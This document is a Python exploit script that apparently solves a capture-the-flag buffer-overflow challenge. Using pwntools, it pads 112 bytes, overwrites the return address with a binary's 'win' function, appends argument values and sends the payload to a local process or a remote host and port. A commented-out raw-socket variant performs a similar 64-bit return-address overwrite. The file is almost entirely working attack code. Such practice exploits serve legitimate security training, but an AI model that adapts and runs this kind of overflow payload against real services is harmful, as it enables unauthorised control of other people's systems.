import argparse
import pwn

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target","-t", type=str, default="",required=False)
parser.add_argument("--port","-p", type=int, default=0,required=False)

args = parser.parse_args()


elf = pwn.ELF('./vuln')

#print(elf.symbols["win"])
#p = elf.process()
#q = pwn.gdb.attach(p)


#print(p.recv().decode("utf-8"))


OFFSET = 112

new_eip = pwn.p32(elf.symbols["win"])
return_address = pwn.p32(elf.symbols["main"])

payload = b"".join(
    [
        b"A" * 112,
        new_eip,
        return_address,
        pwn.p32(0xCAFEF00D),
        pwn.p32(0xF00DF00D),
    ]    
)

payload += b"\n"

with open("payload", "wb") as filp:
    filp.write(payload)

if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("Suplly -t for target and -p for port")
        exit()
    p = pwn.remote(args.target, args.port)


#g = pwn.gdb.attach(
#    p,
#    gdbscript="""
#    b *win
#    r < payload
#    """,
#)



#print(p.recv().decode("utf-8"))
p.sendline(payload)
#print(p.recv().decode("latin-1"))
print(p.recvall().decode("latin-1"))













'''

import socket
import argparse
import struct


parser = argparse.ArgumentParser()
parser.add_argument(
    "host",
    type=str, 
    help="The hostname or IP address to connect to",)
parser.add_argument(
    "port", 
    type=int, 
    help="The port for the service to connect to",)

args = parser.parse_args()

#>>> "A" * (32+4+4+4) + "\xf6\x91\x04\x08"
#'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÃ¶\x91\x04\x08'

offset = 72

#new_rip = struct.pack("<Q", 0x40123B) # win function within the vuln binary

payload = b"".join(
    [
        b"A" * offset,
        #new_rip,
        b"\x3b\x12\x40"
    ]
)
#print(args.host, args.port)

payload += b"\n"

with socket.socket() as connection:
    
    connection.connect((args.host, args.port))
    connection.recv(4096).decode('utf-8')
    connection.send(payload)
    print(connection.recv(4096).decode('utf-8'))
    print(connection.recv(4096).decode('utf-8'))
    print(connection.recv(4096).decode('utf-8'))
'''

